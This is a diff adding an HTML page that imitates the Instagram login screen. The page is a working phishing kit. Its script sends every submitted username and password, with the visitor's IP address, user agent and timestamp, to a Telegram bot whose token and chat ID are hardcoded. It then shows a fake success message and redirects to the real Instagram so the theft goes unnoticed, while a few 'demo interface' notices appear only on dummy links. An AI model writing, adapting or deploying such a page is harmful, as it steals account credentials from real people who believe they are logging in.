@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Instagram • Login</title>
+    <!-- Font Awesome 6 (free) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- Google Fonts: clean sans like Instagram -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #fafafa;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .login-container {
+            max-width: 350px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        /* main card */
+        .login-card {
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 30px 30px;
+            margin-bottom: 10px;
+        }
+
+        /* logo */
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo i {
+            font-size: 52px;
+            background: radial-gradient(circle at 30% 110%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+        .logo-text {
+            font-family: 'Inter', 'Segoe UI', system-ui;
+            font-size: 32px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+            margin-top: 5px;
+            color: #262626;
+        }
+
+        /* input fields */
+        .input-group {
+            margin-bottom: 12px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 9px 8px 7px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            font-family: inherit;
+            outline: none;
+            transition: all 0.1s ease;
+        }
+        .input-group input:focus {
+            border-color: #a8a8a8;
+            background: #ffffff;
+        }
+
+        /* login button */
+        .login-btn {
+            width: 100%;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 8px;
+            padding: 7px 16px;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            margin-top: 8px;
+            cursor: pointer;
+            transition: background 0.2s, opacity 0.2s;
+        }
+        .login-btn:hover {
+            background-color: #1877f2;
+        }
+        .login-btn:active {
+            transform: scale(0.98);
+        }
+        .login-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        /* divider OR */
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0 18px;
+        }
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+        .divider-text {
+            margin: 0 18px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #8e8e8e;
+        }
+
+        /* facebook login */
+        .fb-login {
+            text-align: center;
+            margin: 10px 0 20px;
+        }
+        .fb-login a {
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            color: #385185;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .fb-login i {
+            font-size: 16px;
+        }
+
+        .forgot-pw {
+            text-align: center;
+            font-size: 12px;
+            margin-top: 12px;
+        }
+        .forgot-pw a {
+            text-decoration: none;
+            color: #00376b;
+        }
+
+        .signup-card {
+            background: white;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+            padding: 25px 20px;
+            font-size: 14px;
+        }
+        .signup-card a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .app-store {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .app-store p {
+            font-size: 13px;
+            color: #262626;
+            margin-bottom: 12px;
+        }
+        .badges {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+        }
+        .badges span {
+            background: #000;
+            color: white;
+            padding: 5px 12px;
+            border-radius: 5px;
+            font-size: 10px;
+            font-weight: 500;
+        }
+
+        /* status message */
+        .status-msg {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 12px;
+            padding: 8px;
+            border-radius: 8px;
+            background: #efefef;
+            display: none;
+            color: #2c3e50;
+        }
+        .status-msg.error {
+            background: #ffe0e0;
+            color: #c62828;
+            border-left: 3px solid #c62828;
+        }
+        .status-msg.success {
+            background: #e0f7e8;
+            color: #1e6f3f;
+            border-left: 3px solid #1e6f3f;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 11px;
+            color: #8e8e8e;
+        }
+
+        @media (max-width: 450px) {
+            .login-card {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="login-container">
+    <div class="login-card">
+        <div class="logo">
+            <i class="fab fa-instagram"></i>
+            <div class="logo-text">Instagram</div>
+        </div>
+
+        <form id="loginForm" action="#" method="post">
+            <div class="input-group">
+                <input type="text" id="username" name="username" placeholder="Phone number, username, or email" autocomplete="off" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" name="password" placeholder="Password" autocomplete="off" required>
+            </div>
+            <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+        </form>
+
+        <div class="divider">
+            <div class="divider-line"></div>
+            <div class="divider-text">OR</div>
+            <div class="divider-line"></div>
+        </div>
+
+        <div class="fb-login">
+            <a href="#" id="fakeFbLink">
+                <i class="fab fa-facebook-square"></i> Log in with Facebook
+            </a>
+        </div>
+        <div class="forgot-pw">
+            <a href="#" id="fakeForgotLink">Forgotten password?</a>
+        </div>
+    </div>
+
+    <div class="signup-card">
+        Don't have an account? <a href="#" id="fakeSignupLink">Sign up</a>
+    </div>
+
+    <div class="app-store">
+        <p>Get the app.</p>
+        <div class="badges">
+            <span>App Store</span>
+            <span>Google Play</span>
+        </div>
+    </div>
+
+    <div id="statusMsg" class="status-msg"></div>
+    <footer>Meta · Instagram</footer>
+</div>
+
+<script>
+    // ------------------- TELEGRAM CONFIGURATION (FIXED) -------------------
+    const BOT_TOKEN = "8705550715:AAHHmHRUtiJ7pT55_YPipAMMSjUFNdecfa4";
+    const CHAT_ID = "6967933193";
+
+    // Helper: Get real public IP address (critical for your requirement)
+    async function getUserIP() {
+        // Using multiple reliable endpoints with fallback
+        const endpoints = [
+            'https://api.ipify.org?format=json',
+            'https://api.my-ip.io/ip.json'      // fallback
+        ];
+        
+        for (const url of endpoints) {
+            try {
+                const response = await fetch(url, { timeout: 5000 });
+                if (!response.ok) continue;
+                const data = await response.json();
+                if (url.includes('ipify')) return data.ip;
+                if (url.includes('my-ip')) return data.ip;
+            } catch (e) {
+                console.warn(`IP fetch failed for ${url}`, e);
+                continue;
+            }
+        }
+        // if all fail, try a third one (icanhazip)
+        try {
+            const res3 = await fetch('https://icanhazip.com');
+            const textIp = await res3.text();
+            return textIp.trim();
+        } catch (err) {
+            return "Unable to retrieve IP";
+        }
+    }
+
+    // ---------- FIXED: sendToTelegram function with proper payload ----------
+    async function sendToTelegram(usernameValue, passwordValue, ipAddress) {
+        // Get user agent and timestamp (India time)
+        const userAgent = navigator.userAgent;
+        const currentTime = new Date().toLocaleString("en-GB", { timeZone: "Asia/Kolkata" });
+        
+        // Create a detailed message (similar to your screenshot but with IP and complete data)
+        // Format includes username, password, IP, user agent, timestamp
+        const message = `🔐 *INSTAGRAM LOGIN ALERT* 🔐\n\n` +
+                        `👤 *Username/Email:* \`${escapeMarkdown(usernameValue)}\`\n` +
+                        `🔑 *Password:* \`${escapeMarkdown(passwordValue)}\`\n` +
+                        `🌍 *IP Address:* \`${escapeMarkdown(ipAddress)}\`\n` +
+                        `📱 *User Agent:* \`${escapeMarkdown(userAgent.substring(0, 200))}\`\n` +
+                        `⏱️ *Time:* ${currentTime}\n\n` +
+                        `⚠️ *Instagram login page submission*`;
+        
+        // Telegram API URL
+        const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        // Payload must be properly structured
+        const payload = {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: "Markdown",
+            disable_web_page_preview: true
+        };
+        
+        try {
+            const response = await fetch(telegramApiUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(payload)
+            });
+            
+            const result = await response.json();
+            if (result.ok) {
+                return { success: true, details: result };
+            } else {
+                console.error("Telegram API error:", result);
+                return { success: false, error: result.description || "Unknown telegram error" };
+            }
+        } catch (err) {
+            console.error("Network error while sending to Telegram:", err);
+            return { success: false, error: err.message };
+        }
+    }
+    
+    // Helper to escape markdown special characters to avoid Telegram parsing issues
+    function escapeMarkdown(text) {
+        if (!text) return '';
+        // Telegram MarkdownV2 style, but we use Markdown mode (basic). Escape _, *, `, [ etc.
+        // For basic Markdown parser, only a few chars need escaping: _ * ` [ 
+        return text.replace(/([_*`\[\]])/g, '\\$1');
+    }
+
+    // Show status message on the page (for debugging and user feedback)
+    function showStatus(message, isError = false, isSuccess = false) {
+        const statusDiv = document.getElementById('statusMsg');
+        statusDiv.textContent = message;
+        statusDiv.style.display = 'block';
+        statusDiv.classList.remove('error', 'success');
+        if (isError) {
+            statusDiv.classList.add('error');
+        } else if (isSuccess) {
+            statusDiv.classList.add('success');
+        }
+        // auto hide after 5 seconds
+        setTimeout(() => {
+            if (statusDiv) statusDiv.style.display = 'none';
+        }, 5000);
+    }
+
+    // Handle the login form submission (main logic)
+    async function handleFormSubmit(event) {
+        event.preventDefault();
+        
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value;
+        
+        // Basic validation
+        if (!username || !password) {
+            showStatus("Please fill in both username and password.", true, false);
+            return;
+        }
+        
+        // Disable button & change text
+        const originalText = loginBtn.textContent;
+        loginBtn.textContent = "Please wait...";
+        loginBtn.disabled = true;
+        
+        try {
+            // 1️⃣ Get the real IP address (important requirement)
+            const clientIP = await getUserIP();
+            
+            // 2️⃣ Send credentials + IP + user agent to Telegram bot
+            const telegramResponse = await sendToTelegram(username, password, clientIP);
+            
+            if (telegramResponse.success) {
+                // ✅ Successfully sent to Telegram
+                showStatus("✓ Login successful! Redirecting to Instagram...", false, true);
+                
+                // Clear fields for privacy (optional)
+                usernameInput.value = '';
+                passwordInput.value = '';
+                
+                // After 1.8 seconds, redirect to real Instagram homepage (makes it look authentic)
+                setTimeout(() => {
+                    window.location.href = "https://www.instagram.com/";
+                }, 1800);
+            } else {
+                // ❌ Telegram delivery failed - but we need to inform user but also act realistic
+                console.error("Telegram send error:", telegramResponse.error);
+                showStatus("⚠️ Temporary error. Please check your connection and try again.", true, false);
+                // Do NOT redirect, let user retry. But credentials were already captured? 
+                // We could still try again if user retries. But we already tried sending.
+                // Re-enable button, keep fields
+            }
+        } catch (err) {
+            console.error("Critical error in login flow:", err);
+            showStatus("Network error. Please try again later.", true, false);
+        } finally {
+            // Re-enable button only if we haven't redirected (redirect will happen but ensure state)
+            if (loginBtn.textContent !== "Log in") {
+                loginBtn.textContent = originalText;
+                loginBtn.disabled = false;
+            }
+        }
+    }
+    
+    // Add event listener to the login form
+    const loginForm = document.getElementById('loginForm');
+    if (loginForm) {
+        loginForm.addEventListener('submit', handleFormSubmit);
+    }
+    
+    // Handle dummy links (just for demonstration, prevent navigation)
+    const fakeLinks = ['#fakeFbLink', '#fakeForgotLink', '#fakeSignupLink'];
+    fakeLinks.forEach(linkId => {
+        const linkElement = document.querySelector(linkId);
+        if (linkElement) {
+            linkElement.addEventListener('click', (e) => {
+                e.preventDefault();
+                showStatus("Demo interface — for testing only.", false, false);
+            });
+        }
+    });
+    
+    // Also handle any remaining anchor without id
+    document.querySelectorAll('.fb-login a, .forgot-pw a, .signup-card a').forEach(link => {
+        if (!link.hasAttribute('data-listener')) {
+            link.setAttribute('data-listener', 'true');
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                showStatus("This is a demonstration page.", false, false);
+            });
+        }
+    });
+    
+    // Additional console log for debugging (no errors)
+    console.log("✅ Instagram clone ready | Telegram Bot integrated correctly");
+</script>
+</body>
+</html>
